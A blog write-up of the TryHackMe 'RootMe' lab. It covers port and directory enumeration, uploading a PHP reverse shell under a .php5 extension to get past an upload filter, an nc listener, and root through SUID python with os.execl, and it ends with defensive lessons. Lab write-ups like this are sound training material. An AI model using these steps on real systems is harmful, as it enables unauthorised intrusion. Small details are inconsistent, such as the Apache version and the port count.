---
layout: post
title:  "TryHackMe | RootMe"
date:   2021-09-12 22:30:00
tags: [Security, TryHackMe, Pentesting]
style: border
color: primary
description: "TryHackMe RootMe Writeup"
---

This is my write-up for the room [RootMe](https://tryhackme.com/room/rrootme) on TryHackMe.

![](https://i.imgur.com/WdADxQ8.png)

**P.S: I highly encourage you to try solving the challenges on your own first then check this writeup if you are stuck.**


## Reconnaissance
---

Target = `10.10.51.3`

## Enumeration / Scanning
---

Let's start with an initial Nmap scan.

### Service / Port Enumeration

```console
# nmap -oN scans/initialscan.nmap -sS -sV -T4 10.10.51.3

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 17:08 CDT
Nmap scan report for 10.10.51.3
Host is up (0.40s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.12 seconds
```

The Nmap scan gives us 3 ports or services.

|Port|State|Service     |Version                                                     |
|----|-----|------------|------------------------------------------------------------|
|80  |open |http        |Apache httpd 2.4.18 ((Ubuntu))                              |
|22  |open |ssh         |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)|
{:.wide}

### Web enumeration

First, let's take a closer look at the HTTP service running.

![Can you root me web page](https://i.imgur.com/cCtka5M.png)

It returns a "Can you root me?" page. 

Okay, so we've established that there is an apache web server running on the target but nothing stands out yet. Let's see if we can build a small site map of the webserver. You can use dirbuster or gobuster or whatever you like.

```console
# gobuster dir --url http://10.10.51.3/ -w /usr/share/wordlists/dirb/common.txt > scans/gobuster.scan
             
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.51.3/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/08 17:12:13 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/css                  (Status: 301) [Size: 306] [--> http://10.10.51.3/css/]
/index.php            (Status: 200) [Size: 616]                             
/js                   (Status: 301) [Size: 305] [--> http://10.10.51.3/js/] 
/panel                (Status: 301) [Size: 308] [--> http://10.10.51.3/panel/]
/server-status        (Status: 403) [Size: 275]                               
/uploads              (Status: 301) [Size: 310] [--> http://10.10.51.3/uploads/]
===============================================================
2021/09/08 17:15:06 Finished
===============================================================
```

Now let’s explore the hidden directories we found. Let’s check out the **panel** directory by visiting http://10.10.51.3/panel/

![Can you root me uplodad page](https://i.imgur.com/Z5C5vCW.png)

Interesting! An upload form.

Let’s check out the **uploads** directory by visiting http://10.10.51.3/uploads/

![Can you root me uplodad page](https://i.imgur.com/R7k75Aw.png)

Okay so things are starting to make sense. We have an upload form and this looks like the directory that the uploads get deposited.

## Gaining Access / Exploitation
---

So what can we do with this upload form and uploads directory? One thing we can do is try to upload a web reverse shell.

First we need to determine what file types are *allowed* to be uploaded. We can do this with ***Intruder*** within Burpsuite.

Upon launching Burp I usually use to the embedded browser. Be sure to go to the Proxy tab and turn off "Intercept".

![](https://i.imgur.com/eZVuNp4.png)

Now we'll visit http://10.10.51.3/panel/ once again in the embedded browser.

We see the upload form once again. We will first try uploading a simple picture to see how the form handles the request.

![](https://i.imgur.com/WuIGEl7.png)

If we click "Veja!" we are presented with our picture we uploaded.

![](https://i.imgur.com/VxAp9wL.png)

Notice the directory path our picture resides. If we explicity visit http://10.10.51.3/uploads/ we confirm that the picture file was successfully uploaded.

![](https://i.imgur.com/zWRJsVW.png)

Now we will try to upload a PHP reverse shell. I simply grabbed a pre-generated one from [https://www.revshells.com](https://www.revshells.com).

![](https://i.imgur.com/8qlx723.png)

Make a file called `shell.php`

```console
# gedit shell.php
```
Copy and paste the shell code. Then save and close `gedit`.

Upload the `shell.php` file to the form.

![](https://i.imgur.com/O1LABev.png)

Oh no! Looks like `.php` files aren't allowed. So what can we do? 

Well like I stated before we utilize Burpsuites ***Intruder***. Click the Proxy tab then select the HTTP History tab.

What we need to do now is find the POST request to the form we previously made.

![](https://i.imgur.com/BOkmwPK.png)

Once you've found the POST request we can right-click and select "Sent to Intruder" or press `Ctrl`{: .key}+`I`{:.key}

Now here I won't explain how to use Intruder for the sake of brevity on this post. That said, be sure to check out the [TryHackMe Burpsuite room](https://tryhackme.com/room/rpburpsuite) for a more detailed explanation on Intruder and many other features within Burpsuite.

Essentially what I did in this process is test various file extensions against the upload form to see which ones are allowed and disallowed. One particular file extension that stood out is `php5`. This allows us to still upload `php` code in our reverse shell but under a alternate extension. For more info on this read this [Nullbyte article](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/). 

Other alternate `php` extensions include:

```console
.pht, .phtml, .php3, .php4, .php5, .php6, .inc
```

Now we'll rename our `shell.php` file to `shell.php5`. Also we will give execute permissions.

```console
# mv shell.php shell.php5
# chmod +x shell.php5
```

Okay so let's setup a listener.

**HOST**
```console
# nc -lvnp 9001               
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

**TARGET**
Now we'll try to upload our reverse shell again.

![](https://i.imgur.com/lzXsHD6.png)

Success! Now we click the file to run it and...

Wala! We have a shell!

```console
Ncat: Connection from 10.10.85.94.
Ncat: Connection from 10.10.85.94:37644.
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:12:17 up  1:17,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (933): Inappropriate ioctl for device
bash: no job control in this shell
www-data@rootme:/$ 
```

## Maintaing Access / Priviledge Escalation
---

Now that we have a foothold into the target we can start trying to priviledge escalate ourselves. We'll use `linpeas.sh`. Basically `linpeas.sh` is a tool for finding a plethora of privesc methods based upon a dynamic list that hacktricks manages. I won't go into detail on how to utilize `linpeas.sh` as there are plenty of tutorials that cover this. Google is your friend. Check out the [linpeas.sh Github repo](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for more info.

```console
╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 31K Jan  8  2020 /usr/bin/wall
-rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/python      <------ THIS!
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at (Unknown SGID binary)
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8268/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8268/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/8268/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/8268/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/8268/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/8268/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/8268/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Oct 10  2019 /snap/core/8268/usr/bin/wall
-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine (Unknown SGID binary)
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/9665/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/9665/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/9665/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/9665/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/9665/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/9665/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/9665/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K May 26  2020 /snap/core/9665/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/9665/usr/bin/wall
```

So it looks like `/usr/bin/python` has SUID and SGID permissions.

We can consult [GTFOBins](https://gtfobins.github.io/gtfobins/python/) for what to do with Python.

![](https://i.imgur.com/16F3eQP.png)

So if we run the command below as suggested we should get root.

**Using Python to get root**
```console
www-data@rootme:/tmp$ cd /usr/bin
cd /usr/bin
www-data@rootme:/usr/bin$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
<hon -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

## Conclusion
---

So what can we learn from this?

- Limit web direcotry traversal is only what is needed
- Uploads should have no execute permissions. Store files in a database if possible rather than a filesystem.
- Upload files should be validated, stripped of any control/special characters. Also only one dot should be allowed.
- Each time a file is uploaded it should be renamed to a random unique hash name to prevent attackers from finding their file.
- Be aware of binaries that can be executed as system or root via SUID/SGID
